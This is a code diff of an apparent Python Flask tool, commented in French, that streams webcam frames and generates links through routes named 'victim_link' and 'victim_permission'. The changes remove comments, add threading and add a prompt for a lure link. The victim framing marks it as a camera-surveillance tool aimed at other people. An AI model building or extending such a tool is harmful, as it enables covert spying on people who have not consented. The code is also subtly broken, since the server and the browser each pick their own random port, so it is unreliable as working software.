@@ -4,6 +4,7 @@ import socket
 import random
 import pyfiglet
 import webbrowser
+import threading
 
 # Initialiser l'application Flask
 app = Flask(__name__)
@@ -43,19 +44,15 @@ def get_random_port():
 
 # Capture du flux vidéo
 def generate_video_stream():
-    # Initialiser OpenCV pour capturer depuis la caméra
     cap = cv2.VideoCapture(0)  # '0' pour la caméra par défaut
     while True:
         ret, frame = cap.read()
         if not ret:
             break
 
-        # Encoder l'image en JPEG
         _, jpeg = cv2.imencode('.jpg', frame)
-        # Convertir l'image en bytes
         frame_bytes = jpeg.tobytes()
 
-        # Transmission de l'image en temps réel
         yield (b'--frame\r\n'
                b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n\r\n')
 
@@ -68,12 +65,10 @@ def video_feed():
 
 @app.route("/")
 def home():
-    # Page principale qui demande le lien à entrer
     return render_template("index.html")
 
 @app.route("/victim_link", methods=["POST"])
 def victim_link():
-    # Retourner un lien unique pour la victime
     user_link = request.json.get("user_link")
     local_ip = get_local_ip()
     port = get_random_port()  # Port aléatoire à chaque fois
@@ -87,21 +82,33 @@ def victim_permission():
 
 @app.route("/stream_link", methods=["POST"])
 def stream_link():
-    # Retourner le lien de flux vidéo et audio en temps réel
     local_ip = get_local_ip()
     port = get_random_port()  # Port aléatoire à chaque exécution
     stream_url = f"http://{local_ip}:{port}/video_feed"
     return jsonify({"stream_url": stream_url})
 
-if __name__ == "__main__":
-    # Lancer le serveur Flask
+def start_flask():
     local_ip = get_local_ip()
     port = get_random_port()
     print(f"Serveur en cours d'exécution : http://{local_ip}:{port}")
-
     display_interface()
 
-    # Ouvrir le navigateur pour l'utilisateur afin de suivre les flux vidéo
-    webbrowser.open(f"http://{local_ip}:{port}")
-
+    # Lancer l'application Flask
     app.run(host="0.0.0.0", port=port)
+
+if __name__ == "__main__":
+    # Demander à l'utilisateur de saisir un lien
+    user_link = input("Veuillez entrer un lien (par exemple : http://example.com) : ")
+
+    # Démarrer le serveur Flask dans un thread séparé
+    thread = threading.Thread(target=start_flask)
+    thread.daemon = True
+    thread.start()
+
+    # Ouvrir le lien dans le navigateur
+    local_ip = get_local_ip()
+    port = get_random_port()
+    webbrowser.open(f"http://{local_ip}:{port}")
+    
+    # Attente que l'utilisateur quitte manuellement
+    thread.join()
